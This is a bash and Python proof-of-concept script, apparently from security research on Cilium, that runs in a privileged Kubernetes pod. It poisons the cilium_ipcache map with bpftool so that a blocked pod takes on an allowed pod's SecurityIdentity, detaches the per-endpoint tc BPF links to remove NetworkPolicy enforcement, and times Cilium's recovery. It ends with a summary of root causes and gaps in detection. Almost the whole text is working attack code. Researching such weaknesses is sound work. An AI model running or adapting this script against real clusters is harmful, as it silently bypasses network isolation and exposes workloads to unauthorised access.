#!/bin/bash
# Cilium BPF State Tampering — Attack Script
#
# Runs INSIDE the privileged attack-pod. Tests two attack vectors:
#   1. ipcache SecurityIdentity poisoning  (make blocked pod look like allowed pod)
#   2. Per-endpoint TC BPF link detachment (remove per-pod enforcement from tc hooks)
#
# Usage:
#   kubectl cp poc/cilium_attack.sh cilium-research/attack-pod:/attack/cilium_attack.sh
#   kubectl exec -it -n cilium-research attack-pod -- bash /attack/cilium_attack.sh \
#       <target_ip> <blocked_ip> <allowed_ip>
#
# Get IPs from:
#   TARGET_IP  — kubectl get pod policy-target  -n cilium-research -o jsonpath='{.status.podIP}'
#   BLOCKED_IP — kubectl get pod blocked-source -n cilium-research -o jsonpath='{.status.podIP}'
#   ALLOWED_IP — kubectl get pod allowed-source -n cilium-research -o jsonpath='{.status.podIP}'

set -uo pipefail

RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

atk()     { echo -e "${RED}[ATTACK ]${NC} $*"; }
inf()     { echo -e "${YELLOW}[INFO   ]${NC} $*"; }
ok()      { echo -e "         ${BOLD}[+]${NC} $*"; }
fail()    { echo -e "${RED}[-]${NC} $*"; }
sep()     { echo -e "${DIM}──────────────────────────────────────────────────────${NC}"; }
section() { echo -e "\n${BOLD}$*${NC}"; sep; }

TARGET_IP="${1:?Usage: $0 <target_ip> <blocked_ip> <allowed_ip>}"
BLOCKED_IP="${2:?}"
ALLOWED_IP="${3:?}"

# ── Phase 0: prerequisites ────────────────────────────────────────────────────
section "Phase 0: Install prerequisites"
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq 2>/dev/null
apt-get install -y -qq python3 curl iproute2 \
    2>&1 | grep -E "^(Unpacking|Setting up|E:)" || true

# Ensure Cilium's copied bpftool is executable (kubectl cp drops the exec bit)
[ -f /usr/local/bin/bpftool ] && chmod +x /usr/local/bin/bpftool

# bpftool resolution order:
#   1. Cilium's static binary (copied via kubectl cp) — works on any kernel
#   2. Real versioned binary under /usr/lib/linux-tools/<kernel>/bpftool
#   3. PATH — Ubuntu wrapper only works if linux-tools-<vm-kernel> is installed
BPFTOOL=$(  { [ -x /usr/local/bin/bpftool ] && echo /usr/local/bin/bpftool; } \
         || ls /usr/lib/linux-tools/*/bpftool 2>/dev/null | sort -V | tail -1 \
         || command -v bpftool 2>/dev/null \
         || true)

# Validate: wrapper at /usr/sbin/bpftool silently fails on minikube VM kernels
if [ -n "$BPFTOOL" ]; then
    $BPFTOOL version >/dev/null 2>&1 || BPFTOOL=""
fi

if [ -z "$BPFTOOL" ]; then
    fail "No working bpftool found. Copy Cilium's static binary first (on the HOST):"
    fail "  CPOD=\$(kubectl get pods -n kube-system -l k8s-app=cilium \\"
    fail "         -o jsonpath='{.items[0].metadata.name}')"
    fail "  kubectl cp kube-system/\${CPOD}:/usr/local/bin/bpftool /tmp/bpftool-cilium"
    fail "  kubectl cp /tmp/bpftool-cilium cilium-research/attack-pod:/usr/local/bin/bpftool"
    exit 1
fi
ok "bpftool: $BPFTOOL  ($(${BPFTOOL} version 2>&1 | head -1))"
ok "python3: $(python3 --version 2>&1)"

echo "$BPFTOOL" > /tmp/_bpftool_path

# ── Phase 1: Discovery ────────────────────────────────────────────────────────
section "Phase 1: Discover Cilium BPF state"

inf "bpffs layout:"
find /sys/fs/bpf -maxdepth 4 2>/dev/null | head -80
echo ""

inf "All BPF maps visible from this container:"
$BPFTOOL map show 2>&1 | head -60 || true
echo ""

# Locate the ipcache map — Cilium 1.15 and earlier: cilium_ipcache
#                          Cilium 1.16+:              cilium_ipcache_v2
IPCACHE_PATH=""
for p in /sys/fs/bpf/tc/globals/cilium_ipcache_v2 \
          /sys/fs/bpf/tc/globals/cilium_ipcache \
          /sys/fs/bpf/cilium/maps/cilium_ipcache_v2 \
          /sys/fs/bpf/cilium/maps/cilium_ipcache; do
    [ -e "$p" ] && { IPCACHE_PATH="$p"; break; }
done
if [ -z "$IPCACHE_PATH" ]; then
    IPCACHE_PATH=$(find /sys/fs/bpf -name "cilium_ipcache*" 2>/dev/null | head -1 || true)
fi

if [ -n "$IPCACHE_PATH" ]; then
    IPCACHE_ID=$($BPFTOOL map show pinned "$IPCACHE_PATH" -j 2>/dev/null \
        | python3 -c "import sys,json; print(json.load(sys.stdin)['id'])" 2>/dev/null || true)
    ok "ipcache map: $IPCACHE_PATH  id=${IPCACHE_ID:-unknown}"
else
    # Fall back: find by name in kernel map table
    IPCACHE_ID=$($BPFTOOL map show -j 2>/dev/null | python3 -c "
import sys, json
for m in json.load(sys.stdin):
    if 'cilium_ipcache' in m.get('name',''):
        print(m['id']); break
" 2>/dev/null || true)
    [ -n "$IPCACHE_ID" ] && ok "ipcache found by kernel name scan  id=$IPCACHE_ID" || \
        fail "cilium_ipcache not found — bpffs may not be accessible"
fi

echo "$IPCACHE_ID" > /tmp/_ipcache_id

# Enumerate per-endpoint TC links (Cilium 1.13+ uses bpf_link for tc attachment)
inf "Per-endpoint BPF link pins:"
find /sys/fs/bpf/cilium/endpoints -name "*.link" -o \
     -path "*/links/*" -not -type d 2>/dev/null | head -30 || \
    ls /sys/fs/bpf/cilium/endpoints/ 2>/dev/null || echo "  (none)"
echo ""
sep

# ── Phase 2: Baseline ─────────────────────────────────────────────────────────
section "Phase 2: Baseline — confirm NetworkPolicy is enforced"
echo -n "  attack-pod → policy-target ($TARGET_IP): "
if curl -s --max-time 3 "http://$TARGET_IP" -o /dev/null 2>/dev/null; then
    echo -e "${RED}ALLOWED${NC} (NetworkPolicy not blocking this pod — check policy selector)"
else
    echo -e "${GREEN}BLOCKED${NC} ✓  (NetworkPolicy enforced)"
fi
echo ""
inf "Verify from blocked-source (HOST terminal):"
echo -e "  ${BOLD}kubectl exec -n cilium-research blocked-source -- curl -s --max-time 3 http://$TARGET_IP${NC}"
sep

# ── Phase 3: ipcache SecurityIdentity Poisoning ───────────────────────────────
section "Phase 3: ipcache SecurityIdentity Poisoning"
atk "Goal: overwrite BLOCKED pod's SecurityIdentity in the ipcache"
atk "      so Cilium's BPF datapath evaluates policy as if it is the ALLOWED pod"
echo ""

if [ -z "$IPCACHE_ID" ]; then
    inf "Skipping — ipcache map not found (see Phase 1 output)"
else

export BPFTOOL IPCACHE_ID BLOCKED_IP ALLOWED_IP TARGET_IP IPCACHE_PATH

python3 << 'PYEOF'
import subprocess, sys, struct, socket, os, re

BPFTOOL      = open('/tmp/_bpftool_path').read().strip()
IPCACHE_ID   = os.environ['IPCACHE_ID']
IPCACHE_PATH = os.environ.get('IPCACHE_PATH', '')
BLOCKED      = os.environ['BLOCKED_IP']
ALLOWED      = os.environ['ALLOWED_IP']

YELLOW = '\033[1;33m'
RED    = '\033[1;31m'
GREEN  = '\033[1;32m'
BOLD   = '\033[1m'
NC     = '\033[0m'

def run(cmd):
    r = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return r.stdout, r.stderr, r.returncode

def inet_hex(ip):
    return socket.inet_aton(ip).hex()   # 4 bytes, network order → e.g. "0af40026"

def dump_raw():
    """Try map id first, then pinned path."""
    out, _, rc = run(f"{BPFTOOL} map dump id {IPCACHE_ID} 2>/dev/null")
    if rc != 0 or not out.strip():
        if IPCACHE_PATH:
            out, _, rc = run(f"{BPFTOOL} map dump pinned {IPCACHE_PATH} 2>/dev/null")
    return out

def parse_entries(raw):
    """
    Parse bpftool hex dump (no-BTF output):
      key: HH HH ...
      value: HH HH ...
    into list of (key_bytes, val_bytes).
    The hex can span multiple lines before the next 'key:' or 'value:'.
    """
    entries = []
    # Normalise: join continuation lines
    lines = raw.replace('\n\t', ' ').replace('\n ', ' ').split('\n')
    raw2 = '\n'.join(lines)
    blocks = re.split(r'\bkey:\s*', raw2)[1:]
    for block in blocks:
        parts = re.split(r'\bvalue:\s*', block, maxsplit=1)
        if len(parts) != 2:
            continue
        k_hex = re.sub(r'\s+', ' ', parts[0].split('\n')[0]).strip()
        v_hex = re.sub(r'\s+', ' ', parts[1].split('\n')[0]).strip()
        try:
            key_b = bytes(int(x, 16) for x in k_hex.split() if x)
            val_b = bytes(int(x, 16) for x in v_hex.split() if x)
            if key_b and val_b:
                entries.append((key_b, val_b))
        except ValueError:
            pass
    return entries

print(f"{YELLOW}[INFO   ]{NC} Dumping ipcache (id={IPCACHE_ID})...")
raw = dump_raw()
entries = parse_entries(raw)
print(f"{YELLOW}[INFO   ]{NC}   Total entries: {len(entries)}")

if not entries:
    print(f"{RED}[-]{NC} Empty parse — raw dump (first 1500 chars):")
    print(raw[:1500])
    sys.exit(0)

# Search for our IPs anywhere in the key bytes
blocked_hex = inet_hex(BLOCKED)
allowed_hex  = inet_hex(ALLOWED)

blocked_entry = None
allowed_entry = None
for kb, vb in entries:
    h = kb.hex()
    if blocked_hex in h:
        blocked_entry = (kb, vb)
    if allowed_hex in h:
        allowed_entry = (kb, vb)

print(f"{RED}[ATTACK ]{NC} blocked-source ({BLOCKED}) found: {blocked_entry is not None}")
print(f"{GREEN}[+      ]{NC} allowed-source ({ALLOWED}) found: {allowed_entry is not None}")

if not blocked_entry or not allowed_entry:
    print(f"\n{YELLOW}[INFO   ]{NC} Could not locate one or both IPs.")
    print(f"  Looking for: blocked={blocked_hex}  allowed={allowed_hex}")
    print(f"\n  First 8 entries (key_hex → val_hex):")
    for kb, vb in entries[:8]:
        print(f"    {kb.hex()}  →  {vb.hex()}")
    print(f"\n{YELLOW}[INFO   ]{NC} ipcache IS readable — no BPF map isolation.")
    print(f"          If IP lookup failed, the pod may not yet have a ipcache entry.")
    sys.exit(0)

# sec_label is the first u32 LE in the value (both ipcache v1 and v2)
def sec_label(vb):
    return struct.unpack('<I', vb[:4])[0] if len(vb) >= 4 else None

blocked_id = sec_label(blocked_entry[1])
allowed_id  = sec_label(allowed_entry[1])

print(f"\n{BOLD}SecurityIdentity lookup:{NC}")
print(f"  {RED}{BLOCKED}{NC}  (blocked-source)  id = {RED}{blocked_id}{NC}")
print(f"  {GREEN}{ALLOWED}{NC}  (allowed-source)  id = {GREEN}{allowed_id}{NC}")

if blocked_id == allowed_id:
    print(f"\n{YELLOW}[INFO   ]{NC} Identities already match — nothing to poison.")
    sys.exit(0)

# Save original for restore
k_str   = ' '.join(f'{b:02x}' for b in blocked_entry[0])
old_str = ' '.join(f'{b:02x}' for b in blocked_entry[1])
open('/tmp/cilium_ipcache_restore', 'w').write(f"{IPCACHE_ID}|{k_str}|{old_str}")

# Build poisoned value: swap sec_label bytes to allowed_id
nv = bytearray(blocked_entry[1])
nv[0] = allowed_id & 0xFF
nv[1] = (allowed_id >> 8)  & 0xFF
nv[2] = (allowed_id >> 16) & 0xFF
nv[3] = (allowed_id >> 24) & 0xFF
new_str = ' '.join(f'{b:02x}' for b in nv)

print(f"\n{RED}[ATTACK ]{NC} Writing poisoned entry:")
print(f"  key:      {k_str}")
print(f"  original: {old_str}  (sec_label={blocked_id})")
print(f"  poisoned: {new_str}  (sec_label={allowed_id}  ← allowed-source identity)")

cmd = f"{BPFTOOL} map update id {IPCACHE_ID} key hex {k_str} value hex {new_str}"
out, err, rc = run(cmd)
if rc == 0:
    print(f"\n{RED}{BOLD}★  IPCACHE POISONED  ★{NC}")
    print(f"   {BLOCKED} → identity {allowed_id}  (was {blocked_id})")
    print(f"   Cilium's tc BPF program will now evaluate NetworkPolicy as if")
    print(f"   this pod has the same identity as 'allowed-source'.")
    open('/tmp/cilium_poison_active', 'w').write('1')
    print(f"\n{YELLOW}[INFO   ]{NC} Test bypass NOW (HOST terminal):")
    print(f"   kubectl exec -n cilium-research blocked-source -- \\")
    print(f"       curl -s --max-time 5 http://{os.environ['TARGET_IP']}")
    print(f"   Expected result: nginx HTML  (policy bypassed)")
else:
    print(f"\n{RED}[-]{NC} Update failed rc={rc}: {err.strip()}")
    print(f"    cmd: {cmd}")
PYEOF

fi   # end ipcache section

sep

# ── Phase 4: Monitor ipcache recovery ─────────────────────────────────────────
if [ -f /tmp/cilium_poison_active ] && [ -n "$IPCACHE_ID" ]; then
    section "Phase 4: Monitor — ipcache correction speed"
    RESTORE_DATA=$(cat /tmp/cilium_ipcache_restore)
    KEY_HEX=$(echo  "$RESTORE_DATA" | cut -d'|' -f2)
    ORIG_VAL=$(echo "$RESTORE_DATA" | cut -d'|' -f3)
    ORIG_COMPACT=$(echo "$ORIG_VAL" | tr -d ' ')

    POISON_START=$(date +%s%3N)
    RECOVERED=0
    inf "Polling every 2 s for up to 120 s..."
    echo ""

    for i in $(seq 1 60); do
        sleep 2
        CURRENT=$($BPFTOOL map lookup id "$IPCACHE_ID" key hex $KEY_HEX 2>/dev/null \
            | grep -oP 'value:\s*\K[0-9a-f ]+' | head -1 | tr -d ' ' || echo "?")

        NOW=$(date +%s%3N)
        ELAPSED=$(( NOW - POISON_START ))

        if [ "$CURRENT" = "$ORIG_COMPACT" ] || \
           [[ "$ORIG_COMPACT" == *"$CURRENT"* && ${#CURRENT} -gt 4 ]]; then
            echo -e "  ${GREEN}[+]${NC} $(date '+%H:%M:%S')  identity RESTORED  (${ELAPSED} ms)"
            echo "$ELAPSED" > /tmp/cilium_ipcache_recovery_ms
            RECOVERED=1
            break
        else
            echo -e "  ${RED}[!]${NC} $(date '+%H:%M:%S')  still poisoned  (${ELAPSED} ms elapsed)"
        fi
    done

    [ "$RECOVERED" -eq 0 ] && {
        NOW=$(date +%s%3N); ELAPSED=$(( NOW - POISON_START ))
        echo -e "\n  ${RED}[!!]${NC} NOT corrected within ${ELAPSED} ms — this is the open window"
        echo "-1" > /tmp/cilium_ipcache_recovery_ms
    }

    section "Phase 4b: Restore original ipcache entry"
    python3 - << 'PYEOF'
import subprocess, sys
data = open('/tmp/cilium_ipcache_restore').read().strip().split('|')
if len(data) != 3: sys.exit(0)
map_id, k, v = data
bt = open('/tmp/_bpftool_path').read().strip()
r = subprocess.run(f"{bt} map update id {map_id} key hex {k} value hex {v}",
                   shell=True, capture_output=True, text=True)
print('\033[1;32m[+]\033[0m ipcache restored' if r.returncode == 0
      else f'\033[1;31m[-]\033[0m restore failed: {r.stderr.strip()}')
PYEOF
    rm -f /tmp/cilium_poison_active
fi
sep

# ── Phase 5: Per-endpoint TC BPF link detachment ──────────────────────────────
#
# Cilium 1.13+ attaches tc programs via bpf_link (pinned under
# /sys/fs/bpf/cilium/endpoints/<ep_id>/links/).
# Detaching a link removes enforcement from that pod's veth pair.
# Older Cilium uses direct tc filter; we handle that via iproute2 fallback.
# ─────────────────────────────────────────────────────────────────────────────
section "Phase 5: Per-endpoint TC BPF link detachment"
atk "Detaching Cilium's tc enforcement from per-endpoint veth pairs"
echo ""

LINKS_BASE="/sys/fs/bpf/cilium/endpoints"
rm -f /tmp/cilium_detached_links

if [ ! -d "$LINKS_BASE" ]; then
    inf "No per-endpoint bpffs directory found at $LINKS_BASE"
    inf "Trying direct tc filter removal via iproute2..."
    # Older Cilium: programs attached directly as tc filters on lxc* veth pairs
    for iface in $(ip link show 2>/dev/null | grep -oP '^\d+: \Klxc[^:@]+' | head -20); do
        inf "Found Cilium veth: $iface"
        tc filter show dev "$iface" ingress 2>/dev/null | head -5 || true
        tc filter show dev "$iface" egress  2>/dev/null | head -5 || true
    done
else
    # Enumerate all link pins across all endpoints
    LINK_PINS=$(find "$LINKS_BASE" -not -type d 2>/dev/null | grep -v "^$" || true)

    if [ -z "$LINK_PINS" ]; then
        inf "No bpf_link pins found under $LINKS_BASE"
        inf "Listing endpoint directories:"
        ls "$LINKS_BASE" 2>/dev/null || true
    else
        echo "$LINK_PINS" | while read -r pin; do
            EPID=$(echo "$pin" | grep -oP 'endpoints/\K[0-9]+')
            LINK_NAME=$(basename "$pin")

            # Get link id and attachment info
            LINK_JSON=$($BPFTOOL link show pinned "$pin" -j 2>/dev/null || echo "{}")
            LINK_ID=$(echo "$LINK_JSON" | python3 -c "
import sys,json
try: print(json.load(sys.stdin).get('id',''))
except: pass
" 2>/dev/null || true)
            LINK_TYPE=$(echo "$LINK_JSON" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    print(d.get('type','?'), d.get('prog',{}).get('name',''))
except: pass
" 2>/dev/null || true)

            if [ -z "$LINK_ID" ]; then
                inf "Could not read link id from $pin — skipping"
                continue
            fi

            atk "Detaching endpoint=$EPID  link=$LINK_NAME  id=$LINK_ID  ($LINK_TYPE)"
            if $BPFTOOL link detach id "$LINK_ID" 2>/dev/null; then
                echo -e "  ${RED}[+] DETACHED link id=$LINK_ID from endpoint $EPID${NC}"
                echo "$LINK_ID:$EPID:$LINK_NAME" >> /tmp/cilium_detached_links
            else
                echo -e "  ${YELLOW}[-] Could not detach link id=$LINK_ID${NC}"
            fi
        done
    fi
fi

echo ""
if [ -f /tmp/cilium_detached_links ]; then
    N=$(wc -l < /tmp/cilium_detached_links)
    atk "$N BPF link(s) detached — Cilium tc enforcement is removed from those endpoints"
    echo ""
    inf "Test bypass NOW (HOST terminal):"
    echo -e "  ${BOLD}kubectl exec -n cilium-research blocked-source -- curl -s --max-time 5 http://$TARGET_IP${NC}"
    echo -e "  ${BOLD}kubectl exec -n cilium-research blocked-source -- curl -s --max-time 5 http://$TARGET_IP -I${NC}"
    echo ""
    inf "Watch for Cilium agent to re-attach (HOST terminal):"
    echo -e "  ${DIM}kubectl logs -n kube-system -l k8s-app=cilium --since=30s | grep -i 'attach\\|link\\|endpoint'${NC}"
    echo ""

    section "Phase 5b: Monitor Cilium re-attachment"
    DETACH_START=$(date +%s%3N)
    TOTAL=$(wc -l < /tmp/cilium_detached_links)
    RECOVERED=0

    for i in $(seq 1 30); do
        sleep 2
        # Check if new link pins appeared for the detached endpoints
        CURRENT_LINKS=$(find "$LINKS_BASE" -not -type d 2>/dev/null | wc -l || echo 0)
        NOW=$(date +%s%3N)
        ELAPSED=$(( NOW - DETACH_START ))

        if [ "$CURRENT_LINKS" -ge "$TOTAL" ]; then
            echo -e "  ${GREEN}[+]${NC} $(date '+%H:%M:%S')  $CURRENT_LINKS link(s) present again  (${ELAPSED} ms)"
            echo "$ELAPSED" > /tmp/cilium_link_recovery_ms
            RECOVERED=1
            break
        else
            echo -e "  ${RED}[!]${NC} $(date '+%H:%M:%S')  only $CURRENT_LINKS/$TOTAL links back  (${ELAPSED} ms elapsed)"
        fi
    done

    [ "$RECOVERED" -eq 0 ] && {
        NOW=$(date +%s%3N); ELAPSED=$(( NOW - DETACH_START ))
        echo -e "\n  ${RED}[!!]${NC} Cilium did NOT re-attach within ${ELAPSED} ms"
        echo "-1" > /tmp/cilium_link_recovery_ms
    }
else
    inf "No links were detached — check output above."
    inf "Try manually listing tc programs:"
    for iface in $(ip link show 2>/dev/null | grep -oP '^\d+: \Klxc[^:@]+' | head -10); do
        inf "  tc filter show dev $iface egress"
        tc filter show dev "$iface" egress 2>/dev/null | head -3 || true
    done
fi
sep

# ── Phase 6: Summary ──────────────────────────────────────────────────────────
section "Phase 6: Research Summary"
echo ""
echo -e "${BOLD}Attack vector 1: ipcache SecurityIdentity Poisoning${NC}"
if [ -f /tmp/cilium_ipcache_recovery_ms ]; then
    REC=$(cat /tmp/cilium_ipcache_recovery_ms)
    [ "$REC" = "-1" ] \
        && echo -e "  ${RED}Write: SUCCESS  |  Cilium correction: NOT OBSERVED (120 s window)${NC}" \
        || echo -e "  ${RED}Write: SUCCESS  |  Cilium correction: ${REC} ms${NC}"
    echo "  Root cause: cilium_ipcache_v2 is a shared BPF LPM-trie map."
    echo "  Any process with CAP_BPF (implicit in privileged containers) can call"
    echo "  BPF_MAP_UPDATE_ELEM. Cilium's per-packet policy lookup uses this map"
    echo "  directly — a poisoned entry bypasses NetworkPolicy for the duration"
    echo "  until cilium-agent reconciles (no continuous integrity check)."
elif [ -n "$IPCACHE_ID" ]; then
    echo "  Map found (id=$IPCACHE_ID). Write result above."
else
    echo "  ipcache map not found — see Phase 1."
fi
echo ""

echo -e "${BOLD}Attack vector 2: Per-endpoint TC BPF link detachment${NC}"
if [ -f /tmp/cilium_link_recovery_ms ]; then
    REC=$(cat /tmp/cilium_link_recovery_ms)
    [ "$REC" = "-1" ] \
        && echo -e "  ${RED}Detach: SUCCESS  |  Cilium recovery: NOT OBSERVED (60 s window)${NC}" \
        || echo -e "  ${RED}Detach: SUCCESS  |  Cilium recovery: ${REC} ms${NC}"
    echo "  Root cause: bpf_link pins in /sys/fs/bpf/cilium/endpoints/ are accessible"
    echo "  from any privileged container with hostPath bpffs mount."
    echo "  bpftool link detach calls BPF_LINK_UPDATE with BPF_F_REPLACE flag = 0,"
    echo "  or BPF_LINK_DETACH — removing the tc program from the veth pair."
    echo "  Cilium has no watchdog that continuously verifies tc attachment integrity."
elif [ -f /tmp/cilium_detached_links ]; then
    echo "  Links detached. Recovery not measured."
else
    echo "  No links detached — check Phase 5 output."
fi
echo ""

echo -e "${BOLD}Preconditions for both attacks:${NC}"
echo "  - Pod must have securityContext.privileged: true"
echo "  - Pod must have hostPath mount of /sys/fs/bpf"
echo "  - This is not a default workload profile, but is grantable via:"
echo "    * Missing or permissive PSA/PSP policy"
echo "    * OPA/Gatekeeper not enforcing hostPath restrictions"
echo "    * Custom admission webhook with override"
echo ""
echo -e "${BOLD}Detection gap:${NC}"
echo "  Cilium agent logs do NOT show:"
echo "    - BPF_MAP_UPDATE_ELEM calls on cilium_ipcache"
echo "    - BPF_LINK_DETACH on its own endpoint links"
echo "  The only signal is a subsequent reconciliation log entry when the"
echo "  agent re-syncs state — no real-time alert, no audit trail."
echo ""
echo -e "${DIM}Cleanup: kubectl delete namespace cilium-research${NC}"
